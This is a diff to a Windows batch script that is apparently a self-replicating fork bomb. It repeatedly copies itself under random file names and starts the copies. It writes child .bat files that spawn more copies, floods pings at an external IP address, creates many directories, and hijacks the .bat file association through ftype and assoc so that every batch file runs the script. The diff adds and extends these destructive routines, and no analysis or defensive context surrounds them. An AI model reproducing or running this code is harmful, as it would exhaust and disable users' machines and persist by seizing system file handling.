@@ -1,7 +1,7 @@
 @echo off
 :r
 set l4=set
-%l4% BAM=copy %0 %0x3 start %0x3
+%l4% BAM=copy %0 %random%.WIZARD.X3.%0 start %random%.WIZARD.X3.%0
 %BAM%
 %BAM%
 %BAM%
@@ -178,8 +178,8 @@ for /f "tokens" %%a in ('TREE C:\ /nh') do (
 %H%
 %O%
 %l4% BANGBANG=BANG%random%BANGBANG%random%%random%%random%%random%.DAEMON.bat
-echo XCOPY %0 %random%BANG%random%BANG%random%BANG%random%.wizard.bat > %BANGBANG%
-echo start %random%BANG%random%BANG%random%BANG%random%.wizard.bat > %BANGBANG%
+echo XCOPY %0 %random%BANG%random%BANG%random%BANG%random%.%0 > %BANGBANG%
+echo start %random%BANG%random%BANG%random%BANG%random%.%0 > %BANGBANG%
 %l4% d5=start BANGBANG
 %O%
 %d5%
@@ -217,9 +217,13 @@ echo start %random%BANG%random%BANG%random%BANG%random%.wizard.bat > %BANGBANG%
 %H%
 %O%
 %l4% d8=%random%%random%%random%%random%.DAEMON.bat
-%l4% k8= > %d8%
-%g% :r8%k8%
-%g% set ur5=copy %0 XD.%random%.%0%k8%
+%l4% %d9%=start %d8%
+%l4% k8=> %d8%
+%g% :r8 %k8%
+%g% set d8=%0 %k8%
+%g% set O=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 %k8%
+%g% set H=HELP %k8%
+%g% set ur5=copy %0 XD.%random%.%0 %k8%
 %g% %ur5% %k8%
 %g% %ur5% %k8%
 %g% %ur5% %k8%
@@ -227,32 +231,43 @@ echo start %random%BANG%random%BANG%random%BANG%random%.wizard.bat > %BANGBANG%
 %g% %ur5% %k8%
 %g% %ur5% %k8%
 %g% %ur5% %k8%
+%g% set d9=start %d8%
+%g% %d8% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %H% %k8%
+%g% %O% %k8%
+%g% %H% %k8%
+%g% %O% %k8%
+%g% %H% %k8%
+%g% %O% %k8%
+%g% %H% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
+%g% %d9% %k8%
+%g% %O% %k8%
 %g% ping 142.251.32.36 /n 44 -l 777 %k8%
 %g% goto r8 %k8%
-%l4% d9=start %d8%
-%O%
 %d9%
-%O%
 %d9%
-%O%
 %d9%
-%O%
 %d9%
-%O%
-%H%
-%O%
-%H%
-%O%
-%H%
-%O%
-%H%
-%O%
 %d9%
-%O%
 %d9%
-%O%
 %d9%
-%O%
+%d9%
+%d9%
+%d9%
+%d9%
 ftype yungus%random%%random%=C:\Windows\System32\cmd.exe /k %0 %*
 %l4% yungus=yungus%random%%random%
 assoc .bat=%yungus%
@@ -312,10 +327,11 @@ title %random%%random%%random%%random%
 %O%
 %O%
 %O%
-%l4% RR76=%0%random%%random%.RR76.bat
-%g% copy %0 %RR76% > %RR76%
-%g% start %RR76% > %RR76%
-%g% mkdir %0%random% > %RR76%
+%l4% RR76=%random%%random%.RR76.bat
+%g% set oq=%random%%random%.%0 > %RR76%
+%g% copy %0 %oq% > %RR76%
+%g% start %oq% > %RR76%
+%g% mkdir %0%random%.WOUND.%random%%random%%random%%random% > %RR76%
 start %RR76%
 %O%
 %O%
